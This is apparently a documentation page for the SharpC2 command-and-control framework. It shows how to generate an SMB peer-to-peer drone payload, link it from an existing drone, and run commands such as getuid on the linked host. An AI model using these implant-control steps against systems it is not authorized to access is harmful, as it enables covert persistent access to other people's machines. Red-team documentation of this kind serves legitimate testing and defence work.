# Peer-to-Peer

SharpC2 has a built-in SMB handler for peer-to-peer C2 between drones.  The handler does not run on the team server, so the `start` command doesn't actually do anything and the handler doesn't have to be running.  The handler simply acts as a template for payload generation.

```text
[handlers] > list

Name          Running
----          -------
default-http  True
default-smb   False
```

```
[drones] > payload default-smb Exe c:\payloads\smb-drone.exe
[+] 204800 bytes saved.
```

Once an SMB payload has been executed, use the `link` command from another drone.

```text
[ba60b4aac6] > link localhost
[+] Tasked Drone to run link.
[+] Drone checked in.  Sent 192 bytes.
[+] Drone task 758e24e2d9 has completed.
[+] Drone 87fe8b8650 checked in from Daniel@Ghost-Canyon.
```

```text
[drones] > list

Guid        Parent      Address        Hostname      Username  Process     Pid    Integrity  Arch  LastSeen
----        ------      -------        --------      --------  -------     ---    ---------  ----  --------
ba60b4aac6  -           192.168.1.229  Ghost-Canyon  Daniel    http-drone  21964  Medium     x64   24/11/2021 20:23:56
87fe8b8650  ba60b4aac6  192.168.1.229  Ghost-Canyon  Daniel    smb-drone   2988   Medium     x64   24/11/2021 20:23:36
```

```text
[drones] > interact 87fe8b8650
[87fe8b8650] > getuid
[+] Tasked Drone to run getuid.
[+] Drone task 3c4eb62f0c is running.

GHOST-CANYON\Daniel

[+] Drone task 3c4eb62f0c has completed.
```